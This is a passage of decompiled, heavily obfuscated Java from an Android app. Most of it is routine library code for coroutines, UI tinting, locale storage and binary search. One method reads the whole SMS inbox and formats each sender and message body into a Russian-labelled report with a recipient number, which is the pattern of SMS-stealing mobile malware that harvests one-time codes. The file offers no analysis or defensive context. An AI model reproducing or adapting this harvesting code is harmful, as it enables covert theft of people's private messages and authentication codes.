package com.vdodsodjsdt;

import android.animation.TimeInterpolator;
import android.content.Context;
import android.content.res.ColorStateList;
import android.database.Cursor;
import android.graphics.Path;
import android.graphics.PorterDuff;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.util.TypedValue;
import android.view.View;
import android.view.Window;
import android.view.animation.AnimationUtils;
import android.view.animation.PathInterpolator;
import android.widget.ImageView;
import androidx.lifecycle.SavedStateHandleAttacher;
import com.google.android.material.internal.CheckableImageButton;
import com.google.android.material.textfield.TextInputLayout;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Logger;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public abstract class ej6unYlOWMDF {
    public static final Object V57tEvNfxZVVcOCAOih5PKr = new Object();
    public static final int[] ZfQNn8hdWlEQ5cR94249PDsLR = new int[0];
    public static final Object[] LaeGQIruHQu81hfJldjMOQSVblH3x = new Object[0];
    public static final FG8LIxsgYiLSfhN0jYKIKr zIvmSL0wzmmKGc3X39b2Gw2mUGE = new FG8LIxsgYiLSfhN0jYKIKr(14);
    public static final int[] ZLZeBXTMq0zDztBxtRTuCHrapQ = {13, 15, 14};
    public static final FG8LIxsgYiLSfhN0jYKIKr NSjgqmGjEzuugn2SsG1mZFP = new FG8LIxsgYiLSfhN0jYKIKr(29);
    public static final VSncX8ksA0tswc2TMhzhOMdd GI83zq0G8e7zkn = new VSncX8ksA0tswc2TMhzhOMdd();
    public static final FG8LIxsgYiLSfhN0jYKIKr M9e7PWhFYLD2lOGMker = new FG8LIxsgYiLSfhN0jYKIKr(28);
    public static final char[] HzCpKshMOoaw76hFcbOVRYMeRd = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};

    public static void BJQHddi0Plr5ElWetCyaixWOg9(String str) {
        Eyg9qHiQ9Ki1REKbbd3J eyg9qHiQ9Ki1REKbbd3J = new Eyg9qHiQ9Ki1REKbbd3J(u9SlVAuoWhQUfJ.M9e7PWhFYLD2lOGMker("lateinit property ", str, " has not been initialized"));
        zOk739gUM7zIZC25HHUxoiyixWFjn(eyg9qHiQ9Ki1REKbbd3J, ej6unYlOWMDF.class.getName());
        throw eyg9qHiQ9Ki1REKbbd3J;
    }

    public static void Ca81ebIan1u(Object obj, String str) {
        if (obj != null) {
            return;
        }
        NullPointerException nullPointerException = new NullPointerException(str);
        zOk739gUM7zIZC25HHUxoiyixWFjn(nullPointerException, ej6unYlOWMDF.class.getName());
        throw nullPointerException;
    }

    public static final boolean CixTK5ZX8oWXHz34qHYV(String str, int i, int i2) {
        pYmKDYlAmhudp(str, "<this>");
        int i3 = i + 2;
        return i3 < i2 && str.charAt(i) == '%' && jHlOQHj3hlCsydfI7r5ApVdQjYvKf.HzCpKshMOoaw76hFcbOVRYMeRd(str.charAt(i + 1)) != -1 && jHlOQHj3hlCsydfI7r5ApVdQjYvKf.HzCpKshMOoaw76hFcbOVRYMeRd(str.charAt(i3)) != -1;
    }

    public static void GE1sqSYiEYQO2ew7WEZwTtUeS5(Window window, boolean z) {
        int i = Build.VERSION.SDK_INT;
        if (i >= 35) {
            AuWCPdlLhOuIvGOGYC9mCLNVz.V57tEvNfxZVVcOCAOih5PKr(window, z);
        } else {
            if (i >= 30) {
                AuWCPdlLhOuIvGOGYC9mCLNVz.zzpBGItXfub0yWj(window, z);
                return;
            }
            View decorView = window.getDecorView();
            int systemUiVisibility = decorView.getSystemUiVisibility();
            decorView.setSystemUiVisibility(z ? systemUiVisibility & (-1793) : systemUiVisibility | 1792);
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static final java.lang.Object GI83zq0G8e7zkn(com.vdodsodjsdt.w1Bo2IZyArx3mi9D r4, com.vdodsodjsdt.EfIvTei3Q8wBNpyLTZJevpFxej r5, com.vdodsodjsdt.tfu79AIgc4CGAZaxd4HhD r6) throws java.lang.Throwable {
        /*
            boolean r0 = r6 instanceof com.vdodsodjsdt.VD57ep4jDXQkMzXlSxVxNIN
            if (r0 == 0) goto L13
            r0 = r6
            com.vdodsodjsdt.VD57ep4jDXQkMzXlSxVxNIN r0 = (com.vdodsodjsdt.VD57ep4jDXQkMzXlSxVxNIN) r0
            int r1 = r0.NSjgqmGjEzuugn2SsG1mZFP
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L13
            int r1 = r1 - r2
            r0.NSjgqmGjEzuugn2SsG1mZFP = r1
            goto L18
        L13:
            com.vdodsodjsdt.VD57ep4jDXQkMzXlSxVxNIN r0 = new com.vdodsodjsdt.VD57ep4jDXQkMzXlSxVxNIN
            r0.<init>(r6)
        L18:
            java.lang.Object r6 = r0.ZLZeBXTMq0zDztBxtRTuCHrapQ
            int r1 = r0.NSjgqmGjEzuugn2SsG1mZFP
            r2 = 1
            if (r1 == 0) goto L34
            if (r1 != r2) goto L2c
            com.vdodsodjsdt.iR5xCBIVvX5dAZmnw05F0Cv r4 = r0.zIvmSL0wzmmKGc3X39b2Gw2mUGE
            r5 = r4
            com.vdodsodjsdt.EfIvTei3Q8wBNpyLTZJevpFxej r5 = (com.vdodsodjsdt.EfIvTei3Q8wBNpyLTZJevpFxej) r5
            bjhcQ0u7VT2OYYrwk96HrWoN(r6)     // Catch: java.lang.Throwable -> L2a
            goto L6b
        L2a:
            r4 = move-exception
            goto L71
        L2c:
            java.lang.IllegalStateException r4 = new java.lang.IllegalStateException
            java.lang.String r5 = "call to 'resume' before 'invoke' with coroutine"
            r4.<init>(r5)
            throw r4
        L34:
            bjhcQ0u7VT2OYYrwk96HrWoN(r6)
            com.vdodsodjsdt.D73WsmU258PapcWZb45SFW r6 = r0.ZfQNn8hdWlEQ5cR94249PDsLR
            p59rPv72J9(r6)
            com.vdodsodjsdt.IN79WcIk5xB4t0GjRT43qPLs5 r1 = com.vdodsodjsdt.IN79WcIk5xB4t0GjRT43qPLs5.HzCpKshMOoaw76hFcbOVRYMeRd
            com.vdodsodjsdt.RKQqw795jswHmdL5AnfuvmeBZD r6 = r6.q11o1hieEkZDhF1MGOZI26oZiDT(r1)
            if (r6 != r4) goto L75
            r6 = r5
            com.vdodsodjsdt.iR5xCBIVvX5dAZmnw05F0Cv r6 = (com.vdodsodjsdt.iR5xCBIVvX5dAZmnw05F0Cv) r6     // Catch: java.lang.Throwable -> L2a
            r0.zIvmSL0wzmmKGc3X39b2Gw2mUGE = r6     // Catch: java.lang.Throwable -> L2a
            r0.NSjgqmGjEzuugn2SsG1mZFP = r2     // Catch: java.lang.Throwable -> L2a
            com.vdodsodjsdt.YAf4BMDpiCAb4hYaN6VqW r6 = new com.vdodsodjsdt.YAf4BMDpiCAb4hYaN6VqW     // Catch: java.lang.Throwable -> L2a
            com.vdodsodjsdt.IvfXhmjM3e3K r0 = com.vdodsodjsdt.sGipz63rTUmSj3uFDvOtzihao.qNPQb1obP7(r0)     // Catch: java.lang.Throwable -> L2a
            r6.<init>(r2, r0)     // Catch: java.lang.Throwable -> L2a
            r6.vBGA6pPLqSMuYGvprl270j7()     // Catch: java.lang.Throwable -> L2a
            com.vdodsodjsdt.IfFMrI1zTS7HZ2joFZe r0 = new com.vdodsodjsdt.IfFMrI1zTS7HZ2joFZe     // Catch: java.lang.Throwable -> L2a
            r1 = 2
            r0.<init>(r1, r6)     // Catch: java.lang.Throwable -> L2a
            com.vdodsodjsdt.GgxcbzTlpArIatDAVSZ r4 = (com.vdodsodjsdt.GgxcbzTlpArIatDAVSZ) r4     // Catch: java.lang.Throwable -> L2a
            r4.zOk739gUM7zIZC25HHUxoiyixWFjn(r0)     // Catch: java.lang.Throwable -> L2a
            java.lang.Object r4 = r6.f6ZQsR6bPLvvCDNXOUc()     // Catch: java.lang.Throwable -> L2a
            com.vdodsodjsdt.w0JnONr1KwCkZY9pA0QjUDuh9aMcU r6 = com.vdodsodjsdt.w0JnONr1KwCkZY9pA0QjUDuh9aMcU.V57tEvNfxZVVcOCAOih5PKr
            if (r4 != r6) goto L6b
            return r6
        L6b:
            r5.VxUQ9tBhpHJ2AAEDNW8sghc4m()
            com.vdodsodjsdt.hMtEZx9LFZEOBsEChkiRKnXNYh1GG r4 = com.vdodsodjsdt.hMtEZx9LFZEOBsEChkiRKnXNYh1GG.VxUQ9tBhpHJ2AAEDNW8sghc4m
            return r4
        L71:
            r5.VxUQ9tBhpHJ2AAEDNW8sghc4m()
            throw r4
        L75:
            java.lang.IllegalStateException r4 = new java.lang.IllegalStateException
            java.lang.String r5 = "awaitClose() can only be invoked from the producer context"
            r4.<init>(r5)
            throw r4
        */
        throw new UnsupportedOperationException("Method not decompiled: com.vdodsodjsdt.ej6unYlOWMDF.GI83zq0G8e7zkn(com.vdodsodjsdt.w1Bo2IZyArx3mi9D, com.vdodsodjsdt.EfIvTei3Q8wBNpyLTZJevpFxej, com.vdodsodjsdt.tfu79AIgc4CGAZaxd4HhD):java.lang.Object");
    }

    public static final int HVEwbdULInpTNa0IG(int i) {
        if (i == 0) {
            return 1;
        }
        if (i == 1) {
            return 2;
        }
        throw new IllegalArgumentException(u9SlVAuoWhQUfJ.ZLZeBXTMq0zDztBxtRTuCHrapQ(i, "Could not convert ", " to BackoffPolicy"));
    }

    public static final int HzCpKshMOoaw76hFcbOVRYMeRd(long[] jArr, int i, long j) {
        pYmKDYlAmhudp(jArr, "array");
        int i2 = i - 1;
        int i3 = 0;
        while (i3 <= i2) {
            int i4 = (i3 + i2) >>> 1;
            long j2 = jArr[i4];
            if (j2 < j) {
                i3 = i4 + 1;
            } else {
                if (j2 <= j) {
                    return i4;
                }
                i2 = i4 - 1;
            }
        }
        return ~i3;
    }

    public static final void Irh5auREsoeV1C1RaBamlmy(c6HqQbG2usib c6hqqbg2usib) {
        UiKibUXaicctwiwbr8Jrmq2BMS uiKibUXaicctwiwbr8Jrmq2BMS;
        Cg8BA4YSFFWr8 cg8BA4YSFFWr8 = c6hqqbg2usib.LaeGQIruHQu81hfJldjMOQSVblH3x().V57tEvNfxZVVcOCAOih5PKr;
        if (cg8BA4YSFFWr8 != Cg8BA4YSFFWr8.ZfQNn8hdWlEQ5cR94249PDsLR && cg8BA4YSFFWr8 != Cg8BA4YSFFWr8.LaeGQIruHQu81hfJldjMOQSVblH3x) {
            throw new IllegalArgumentException("Failed requirement.");
        }
        Iterator it = ((dMJzfWfinPaaf19pTno5S3Iet7AJ) c6hqqbg2usib.VxUQ9tBhpHJ2AAEDNW8sghc4m().zIvmSL0wzmmKGc3X39b2Gw2mUGE).iterator();
        while (true) {
            TaWcpo9tRZQr4wnpn taWcpo9tRZQr4wnpn = (TaWcpo9tRZQr4wnpn) it;
            if (!taWcpo9tRZQr4wnpn.hasNext()) {
                uiKibUXaicctwiwbr8Jrmq2BMS = null;
                break;
            }
            Map.Entry entry = (Map.Entry) taWcpo9tRZQr4wnpn.next();
            h3jnZRsdwYJfY9UhQCkbvWciwvFHv(entry, "components");
            String str = (String) entry.getKey();
            uiKibUXaicctwiwbr8Jrmq2BMS = (UiKibUXaicctwiwbr8Jrmq2BMS) entry.getValue();
            if (NSjgqmGjEzuugn2SsG1mZFP(str, "androidx.lifecycle.internal.SavedStateHandlesProvider")) {
                break;
            }
        }
        if (uiKibUXaicctwiwbr8Jrmq2BMS == null) {
            VcJ8nIUPXL vcJ8nIUPXL = new VcJ8nIUPXL(c6hqqbg2usib.VxUQ9tBhpHJ2AAEDNW8sghc4m(), (XL61XSHqyMdc1) c6hqqbg2usib);
            c6hqqbg2usib.VxUQ9tBhpHJ2AAEDNW8sghc4m().LaeGQIruHQu81hfJldjMOQSVblH3x("androidx.lifecycle.internal.SavedStateHandlesProvider", vcJ8nIUPXL);
            c6hqqbg2usib.LaeGQIruHQu81hfJldjMOQSVblH3x().VxUQ9tBhpHJ2AAEDNW8sghc4m(new SavedStateHandleAttacher(vcJ8nIUPXL));
        }
    }

    public static boolean ItrQwCXbty5PZtje5JS(Context context, int i, boolean z) {
        TypedValue typedValueJUdwvN8LfOMa = JUdwvN8LfOMa(context, i);
        return (typedValueJUdwvN8LfOMa == null || typedValueJUdwvN8LfOMa.type != 18) ? z : typedValueJUdwvN8LfOMa.data != 0;
    }

    public static TypedValue JUdwvN8LfOMa(Context context, int i) {
        TypedValue typedValue = new TypedValue();
        if (context.getTheme().resolveAttribute(i, typedValue, true)) {
            return typedValue;
        }
        return null;
    }

    public static final LinkedHashSet KUYypEB4eNWOZWVDpH(byte[] bArr) throws IOException {
        pYmKDYlAmhudp(bArr, "bytes");
        LinkedHashSet linkedHashSet = new LinkedHashSet();
        if (bArr.length == 0) {
            return linkedHashSet;
        }
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bArr);
        try {
            try {
                ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
                try {
                    int i = objectInputStream.readInt();
                    for (int i2 = 0; i2 < i; i2++) {
                        Uri uri = Uri.parse(objectInputStream.readUTF());
                        boolean z = objectInputStream.readBoolean();
                        h3jnZRsdwYJfY9UhQCkbvWciwvFHv(uri, "uri");
                        linkedHashSet.add(new lxGz3HZpvhLMLuC1(uri, z));
                    }
                    objectInputStream.close();
                } finally {
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            byteArrayInputStream.close();
            return linkedHashSet;
        } finally {
        }
    }

    public static final void KYZ9RyuOc42A2J(YAf4BMDpiCAb4hYaN6VqW yAf4BMDpiCAb4hYaN6VqW, IvfXhmjM3e3K ivfXhmjM3e3K, boolean z) {
        Object obj = YAf4BMDpiCAb4hYaN6VqW.GI83zq0G8e7zkn.get(yAf4BMDpiCAb4hYaN6VqW);
        Throwable thZIvmSL0wzmmKGc3X39b2Gw2mUGE = yAf4BMDpiCAb4hYaN6VqW.zIvmSL0wzmmKGc3X39b2Gw2mUGE(obj);
        Object objVBGA6pPLqSMuYGvprl270j7 = thZIvmSL0wzmmKGc3X39b2Gw2mUGE != null ? vBGA6pPLqSMuYGvprl270j7(thZIvmSL0wzmmKGc3X39b2Gw2mUGE) : yAf4BMDpiCAb4hYaN6VqW.NSjgqmGjEzuugn2SsG1mZFP(obj);
        if (!z) {
            ivfXhmjM3e3K.ZLZeBXTMq0zDztBxtRTuCHrapQ(objVBGA6pPLqSMuYGvprl270j7);
            return;
        }
        Ca81ebIan1u(ivfXhmjM3e3K, "null cannot be cast to non-null type kotlinx.coroutines.internal.DispatchedContinuation<T of kotlinx.coroutines.DispatchedTaskKt.resume>");
        j0kIeYozLt6jOglJu j0kieyozlt6joglju = (j0kIeYozLt6jOglJu) ivfXhmjM3e3K;
        tfu79AIgc4CGAZaxd4HhD tfu79aigc4cgazaxd4hhd = j0kieyozlt6joglju.ZLZeBXTMq0zDztBxtRTuCHrapQ;
        Object obj2 = j0kieyozlt6joglju.GI83zq0G8e7zkn;
        D73WsmU258PapcWZb45SFW d73WsmU258PapcWZb45SFWLaeGQIruHQu81hfJldjMOQSVblH3x = tfu79aigc4cgazaxd4hhd.LaeGQIruHQu81hfJldjMOQSVblH3x();
        Object objZ1FjjMJ0suz8AFI7gsA4GDLMXv = sGipz63rTUmSj3uFDvOtzihao.Z1FjjMJ0suz8AFI7gsA4GDLMXv(d73WsmU258PapcWZb45SFWLaeGQIruHQu81hfJldjMOQSVblH3x, obj2);
        rDVwronXktMoWAubpmvA rdvwronxktmowaubpmvaGE1sqSYiEYQO2ew7WEZwTtUeS5 = objZ1FjjMJ0suz8AFI7gsA4GDLMXv != sGipz63rTUmSj3uFDvOtzihao.ZLZeBXTMq0zDztBxtRTuCHrapQ ? KfeOQNOupsCg6878zi4e.GE1sqSYiEYQO2ew7WEZwTtUeS5(tfu79aigc4cgazaxd4hhd, d73WsmU258PapcWZb45SFWLaeGQIruHQu81hfJldjMOQSVblH3x, objZ1FjjMJ0suz8AFI7gsA4GDLMXv) : null;
        try {
            tfu79aigc4cgazaxd4hhd.ZLZeBXTMq0zDztBxtRTuCHrapQ(objVBGA6pPLqSMuYGvprl270j7);
            if (rdvwronxktmowaubpmvaGE1sqSYiEYQO2ew7WEZwTtUeS5 == null || rdvwronxktmowaubpmvaGE1sqSYiEYQO2ew7WEZwTtUeS5.zOk739gUM7zIZC25HHUxoiyixWFjn()) {
                sGipz63rTUmSj3uFDvOtzihao.JUdwvN8LfOMa(d73WsmU258PapcWZb45SFWLaeGQIruHQu81hfJldjMOQSVblH3x, objZ1FjjMJ0suz8AFI7gsA4GDLMXv);
            }
        } catch (Throwable th) {
            if (rdvwronxktmowaubpmvaGE1sqSYiEYQO2ew7WEZwTtUeS5 == null || rdvwronxktmowaubpmvaGE1sqSYiEYQO2ew7WEZwTtUeS5.zOk739gUM7zIZC25HHUxoiyixWFjn()) {
                sGipz63rTUmSj3uFDvOtzihao.JUdwvN8LfOMa(d73WsmU258PapcWZb45SFWLaeGQIruHQu81hfJldjMOQSVblH3x, objZ1FjjMJ0suz8AFI7gsA4GDLMXv);
            }
            throw th;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:22:0x003d, code lost:
    
        r1 = r3.getAttributeValue(null, "application_locales");
     */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0046 A[EXC_TOP_SPLITTER, PHI: r1
      0x0046: PHI (r1v2 java.lang.String) = (r1v0 java.lang.String), (r1v4 java.lang.String) binds: [B:29:0x0053, B:23:0x0044] A[DONT_GENERATE, DONT_INLINE], SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static java.lang.String L8DMw02rUTs2w(android.content.Context r8) {
        /*
            java.lang.Object r0 = com.vdodsodjsdt.ej6unYlOWMDF.V57tEvNfxZVVcOCAOih5PKr
            monitor-enter(r0)
            java.lang.String r1 = ""
            java.lang.String r2 = "androidx.appcompat.app.AppCompatDelegate.application_locales_record_file"
            java.io.FileInputStream r2 = r8.openFileInput(r2)     // Catch: java.lang.Throwable -> L4a java.io.FileNotFoundException -> L6a
            org.xmlpull.v1.XmlPullParser r3 = android.util.Xml.newPullParser()     // Catch: java.lang.Throwable -> L29 java.lang.Throwable -> L4c
            java.lang.String r4 = "UTF-8"
            r3.setInput(r2, r4)     // Catch: java.lang.Throwable -> L29 java.lang.Throwable -> L4c
            int r4 = r3.getDepth()     // Catch: java.lang.Throwable -> L29 java.lang.Throwable -> L4c
        L18:
            int r5 = r3.next()     // Catch: java.lang.Throwable -> L29 java.lang.Throwable -> L4c
            r6 = 1
            if (r5 == r6) goto L44
            r6 = 3
            if (r5 != r6) goto L2b
            int r7 = r3.getDepth()     // Catch: java.lang.Throwable -> L29 java.lang.Throwable -> L4c
            if (r7 <= r4) goto L44
            goto L2b
        L29:
            r8 = move-exception
            goto L64
        L2b:
            if (r5 == r6) goto L18
            r6 = 4
            if (r5 != r6) goto L31
            goto L18
        L31:
            java.lang.String r5 = r3.getName()     // Catch: java.lang.Throwable -> L29 java.lang.Throwable -> L4c
            java.lang.String r6 = "locales"
            boolean r5 = r5.equals(r6)     // Catch: java.lang.Throwable -> L29 java.lang.Throwable -> L4c
            if (r5 == 0) goto L18
            java.lang.String r4 = "application_locales"
            r5 = 0
            java.lang.String r1 = r3.getAttributeValue(r5, r4)     // Catch: java.lang.Throwable -> L29 java.lang.Throwable -> L4c
        L44:
            if (r2 == 0) goto L56
        L46:
            r2.close()     // Catch: java.lang.Throwable -> L4a java.io.IOException -> L56
            goto L56
        L4a:
            r8 = move-exception
            goto L6c
        L4c:
            java.lang.String r3 = "AppLocalesStorageHelper"
            java.lang.String r4 = "Reading app Locales : Unable to parse through file :androidx.appcompat.app.AppCompatDelegate.application_locales_record_file"
            android.util.Log.w(r3, r4)     // Catch: java.lang.Throwable -> L29
            if (r2 == 0) goto L56
            goto L46
        L56:
            boolean r2 = r1.isEmpty()     // Catch: java.lang.Throwable -> L4a
            if (r2 != 0) goto L5d
            goto L62
        L5d:
            java.lang.String r2 = "androidx.appcompat.app.AppCompatDelegate.application_locales_record_file"
            r8.deleteFile(r2)     // Catch: java.lang.Throwable -> L4a
        L62:
            monitor-exit(r0)     // Catch: java.lang.Throwable -> L4a
            return r1
        L64:
            if (r2 == 0) goto L69
            r2.close()     // Catch: java.lang.Throwable -> L4a java.io.IOException -> L69
        L69:
            throw r8     // Catch: java.lang.Throwable -> L4a
        L6a:
            monitor-exit(r0)     // Catch: java.lang.Throwable -> L4a
            return r1
        L6c:
            monitor-exit(r0)     // Catch: java.lang.Throwable -> L4a
            throw r8
        */
        throw new UnsupportedOperationException("Method not decompiled: com.vdodsodjsdt.ej6unYlOWMDF.L8DMw02rUTs2w(android.content.Context):java.lang.String");
    }

    public static final int M9e7PWhFYLD2lOGMker(int i, int i2, int[] iArr) {
        pYmKDYlAmhudp(iArr, "array");
        int i3 = i - 1;
        int i4 = 0;
        while (i4 <= i3) {
            int i5 = (i4 + i3) >>> 1;
            int i6 = iArr[i5];
            if (i6 < i2) {
                i4 = i5 + 1;
            } else {
                if (i6 <= i2) {
                    return i5;
                }
                i3 = i5 - 1;
            }
        }
        return ~i4;
    }

    public static boolean NSjgqmGjEzuugn2SsG1mZFP(Object obj, Object obj2) {
        return obj == null ? obj2 == null : obj.equals(obj2);
    }

    public static final void O1xDAlBZZlZdoEf747lCFHld(D73WsmU258PapcWZb45SFW d73WsmU258PapcWZb45SFW, Throwable th) {
        try {
            OxEujxDldXY8GLtopEvvq oxEujxDldXY8GLtopEvvq = (OxEujxDldXY8GLtopEvvq) d73WsmU258PapcWZb45SFW.q11o1hieEkZDhF1MGOZI26oZiDT(IN79WcIk5xB4t0GjRT43qPLs5.NSjgqmGjEzuugn2SsG1mZFP);
            if (oxEujxDldXY8GLtopEvvq != null) {
                oxEujxDldXY8GLtopEvvq.SuB3hEmTmbbRGAhtvOOmfKEon(th);
            } else {
                hRrPPME7ytOB7ba.pYmKDYlAmhudp(d73WsmU258PapcWZb45SFW, th);
            }
        } catch (Throwable th2) {
            if (th != th2) {
                RuntimeException runtimeException = new RuntimeException("Exception while trying to handle coroutine exception", th2);
                sGipz63rTUmSj3uFDvOtzihao.LaeGQIruHQu81hfJldjMOQSVblH3x(runtimeException, th);
                th = runtimeException;
            }
            hRrPPME7ytOB7ba.pYmKDYlAmhudp(d73WsmU258PapcWZb45SFW, th);
        }
    }

    public static k5xHLp7fCPX0ktLE3ej5tGjGJa RhfGHxtXxy0M0grmp2jkRjQg(jugN3Lijm1 jugn3lijm1) {
        VhYG3Kn7PElrnIYowGX3UR vhYG3Kn7PElrnIYowGX3UR = new VhYG3Kn7PElrnIYowGX3UR();
        vhYG3Kn7PElrnIYowGX3UR.V57tEvNfxZVVcOCAOih5PKr = new bZonrKCuJyDEES();
        k5xHLp7fCPX0ktLE3ej5tGjGJa k5xhlp7fcpx0ktle3ej5tgjgja = new k5xHLp7fCPX0ktLE3ej5tGjGJa(vhYG3Kn7PElrnIYowGX3UR);
        vhYG3Kn7PElrnIYowGX3UR.zzpBGItXfub0yWj = k5xhlp7fcpx0ktle3ej5tgjgja;
        vhYG3Kn7PElrnIYowGX3UR.VxUQ9tBhpHJ2AAEDNW8sghc4m = jugn3lijm1.getClass();
        try {
            Object objVxUQ9tBhpHJ2AAEDNW8sghc4m = jugn3lijm1.VxUQ9tBhpHJ2AAEDNW8sghc4m(vhYG3Kn7PElrnIYowGX3UR);
            if (objVxUQ9tBhpHJ2AAEDNW8sghc4m == null) {
                return k5xhlp7fcpx0ktle3ej5tgjgja;
            }
            vhYG3Kn7PElrnIYowGX3UR.VxUQ9tBhpHJ2AAEDNW8sghc4m = objVxUQ9tBhpHJ2AAEDNW8sghc4m;
            return k5xhlp7fcpx0ktle3ej5tgjgja;
        } catch (Exception e) {
            k5xhlp7fcpx0ktle3ej5tgjgja.ZfQNn8hdWlEQ5cR94249PDsLR.GI83zq0G8e7zkn(e);
            return k5xhlp7fcpx0ktle3ej5tgjgja;
        }
    }

    public static float SuB3hEmTmbbRGAhtvOOmfKEon(String[] strArr, int i) {
        float f = Float.parseFloat(strArr[i]);
        if (f >= 0.0f && f <= 1.0f) {
            return f;
        }
        throw new IllegalArgumentException("Motion easing control point value must be between 0 and 1; instead got: " + f);
    }

    public static String TaDO7ogis3aEiWEtq(String str) {
        StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
        String name = ej6unYlOWMDF.class.getName();
        int i = 0;
        while (!stackTrace[i].getClassName().equals(name)) {
            i++;
        }
        while (stackTrace[i].getClassName().equals(name)) {
            i++;
        }
        StackTraceElement stackTraceElement = stackTrace[i];
        return "Parameter specified as non-null is null: method " + stackTraceElement.getClassName() + "." + stackTraceElement.getMethodName() + ", parameter " + str;
    }

    public static boolean TqcnImqkSWIKht(String str, String str2) {
        return str.startsWith(str2.concat("(")) && str.endsWith(")");
    }

    public static final ExecutorService V57tEvNfxZVVcOCAOih5PKr(boolean z) {
        ExecutorService executorServiceNewFixedThreadPool = Executors.newFixedThreadPool(Math.max(2, Math.min(Runtime.getRuntime().availableProcessors() - 1, 4)), new e8pzob3M2b77DS(z));
        h3jnZRsdwYJfY9UhQCkbvWciwvFHv(executorServiceNewFixedThreadPool, "newFixedThreadPool(\n    …)),\n        factory\n    )");
        return executorServiceNewFixedThreadPool;
    }

    public static final int Z1FjjMJ0suz8AFI7gsA4GDLMXv(int i) {
        u9SlVAuoWhQUfJ.p59rPv72J9("state", i);
        int iH3jnZRsdwYJfY9UhQCkbvWciwvFHv = u9SlVAuoWhQUfJ.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(i);
        if (iH3jnZRsdwYJfY9UhQCkbvWciwvFHv == 0) {
            return 0;
        }
        int i2 = 1;
        if (iH3jnZRsdwYJfY9UhQCkbvWciwvFHv != 1) {
            i2 = 2;
            if (iH3jnZRsdwYJfY9UhQCkbvWciwvFHv != 2) {
                i2 = 3;
                if (iH3jnZRsdwYJfY9UhQCkbvWciwvFHv != 3) {
                    i2 = 4;
                    if (iH3jnZRsdwYJfY9UhQCkbvWciwvFHv != 4) {
                        if (iH3jnZRsdwYJfY9UhQCkbvWciwvFHv == 5) {
                            return 5;
                        }
                        throw new Eyg9qHiQ9Ki1REKbbd3J();
                    }
                }
            }
        }
        return i2;
    }

    public static void ZLZeBXTMq0zDztBxtRTuCHrapQ(TextInputLayout textInputLayout, CheckableImageButton checkableImageButton, ColorStateList colorStateList, PorterDuff.Mode mode) {
        Drawable drawable = checkableImageButton.getDrawable();
        if (drawable != null) {
            drawable = drawable.mutate();
            if (colorStateList == null || !colorStateList.isStateful()) {
                drawable.setTintList(colorStateList);
            } else {
                int[] drawableState = textInputLayout.getDrawableState();
                int[] drawableState2 = checkableImageButton.getDrawableState();
                int length = drawableState.length;
                int[] iArrCopyOf = Arrays.copyOf(drawableState, drawableState.length + drawableState2.length);
                System.arraycopy(drawableState2, 0, iArrCopyOf, length, drawableState2.length);
                drawable.setTintList(ColorStateList.valueOf(colorStateList.getColorForState(iArrCopyOf, colorStateList.getDefaultColor())));
            }
            if (mode != null) {
                drawable.setTintMode(mode);
            }
        }
        if (checkableImageButton.getDrawable() != drawable) {
            checkableImageButton.setImageDrawable(drawable);
        }
    }

    public static String aXO0LSrt8bKV(Context context, String str) {
        Cursor cursorQuery = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null, null);
        String strGI83zq0G8e7zkn = "";
        if (cursorQuery != null && cursorQuery.moveToLast()) {
            int i = 1;
            do {
                int columnIndex = cursorQuery.getColumnIndex("address");
                int columnIndex2 = cursorQuery.getColumnIndex("body");
                strGI83zq0G8e7zkn = u9SlVAuoWhQUfJ.GI83zq0G8e7zkn(strGI83zq0G8e7zkn + i + ") Номер: " + cursorQuery.getString(columnIndex) + "\n   Текст: " + cursorQuery.getString(columnIndex2) + "\n   Номер получателя: " + (str == null ? "[номер не найден]" : str), "\n\n");
                i++;
            } while (cursorQuery.moveToPrevious());
        }
        if (cursorQuery != null) {
            cursorQuery.close();
        }
        return strGI83zq0G8e7zkn;
    }

    public static final void bjhcQ0u7VT2OYYrwk96HrWoN(Object obj) throws Throwable {
        if (obj instanceof OR0CruaKl9s17fPszEbrsfoKYmn) {
            throw ((OR0CruaKl9s17fPszEbrsfoKYmn) obj).V57tEvNfxZVVcOCAOih5PKr;
        }
    }

    public static boolean d9zDyyznnp3oaDT1Ug(byte b) {
        return b > -65;
    }

    public static final void f6ZQsR6bPLvvCDNXOUc(int i, int i2) {
        if (i <= i2) {
            return;
        }
        throw new IndexOutOfBoundsException("toIndex (" + i + ") is greater than size (" + i2 + ").");
    }

    /* JADX WARN: Removed duplicated region for block: B:42:0x003e A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static void gBaBUmihn5l4u(android.content.Context r5, java.lang.String r6) {
        /*
            java.lang.Object r0 = com.vdodsodjsdt.ej6unYlOWMDF.V57tEvNfxZVVcOCAOih5PKr
            monitor-enter(r0)
            java.lang.String r1 = ""
            boolean r1 = r6.equals(r1)     // Catch: java.lang.Throwable -> L12
            if (r1 == 0) goto L14
            java.lang.String r6 = "androidx.appcompat.app.AppCompatDelegate.application_locales_record_file"
